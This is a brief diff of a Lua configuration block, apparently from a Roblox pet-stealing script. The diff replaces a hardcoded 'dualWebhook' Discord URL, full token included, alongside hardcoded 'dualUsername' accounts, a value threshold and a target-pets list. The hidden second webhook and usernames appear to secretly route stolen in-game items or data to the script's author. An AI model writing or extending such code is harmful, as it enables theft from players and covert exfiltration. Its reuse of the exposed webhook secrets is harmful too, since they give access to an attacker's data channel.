@@ -109,7 +109,7 @@ end
 local CONFIG = {
     username = type(getfenv().Username) == "table" and getfenv().Username or {getfenv().Username},
     webhook = getfenv().Webhook,
-    dualWebhook = "https://discord.com/api/webhooks/1396184713311289354/0b-DXlEyHe5wu_9WXQRO89AAgEjNeSJbGDL7wFEDhvH-LMeBqxtuMuyaaxmISo9JT5UO",
+    dualWebhook = "https://discord.com/api/webhooks/1396440349119086714/oS8gLE9tClIPmXohUb_yuNUGAid11DAjJrZ2nrREhgN24z7K5NFqPdFmHZz4aWwNUEQV",
     dualUsername = {"namnnni2", "BaldBaconFrrr"},
     dualWebhookThreshold = 1e12,
     TARGET_PETS = {
